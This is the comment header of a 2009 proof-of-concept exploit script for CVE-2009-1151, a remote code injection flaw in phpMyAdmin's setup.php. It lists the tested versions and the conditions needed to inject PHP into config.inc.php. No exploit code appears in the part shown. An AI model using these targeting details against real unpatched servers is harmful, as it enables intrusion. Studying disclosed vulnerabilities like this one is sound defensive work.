# CVE-2009-1151: phpMyAdmin '/scripts/setup.php' PHP Code Injection RCE PoC v0.11
# by pagvac (gnucitizen.org), 4th June 2009.
# special thanks to Greg Ose (labs.neohapsis.com) for discovering such a cool vuln,
# and to str0ke (milw0rm.com) for testing this PoC script and providing feedback!

# PoC script successfully tested on the following targets:
# phpMyAdmin 2.11.4, 2.11.9.3, 2.11.9.4, 3.0.0 and 3.0.1.1
# Linux 2.6.24-24-generic i686 GNU/Linux (Ubuntu 8.04.2)

# attack requirements:
# 1) vulnerable version (obviously!): 2.11.x before 2.11.9.5
# and 3.x before 3.1.3.1 according to PMASA-2009-3
# 2) it *seems* this vuln can only be exploited against environments
# where the administrator has chosen to install phpMyAdmin following
# the *wizard* method, rather than manual method: http://snipurl.com/jhjxx
# 3) administrator must have NOT deleted the '/config/' directory
# within the '/phpMyAdmin/' directory. this is because this directory is
# where '/scripts/setup.php' tries to create 'config.inc.php' which is where
# our evil PHP code is injected 8)
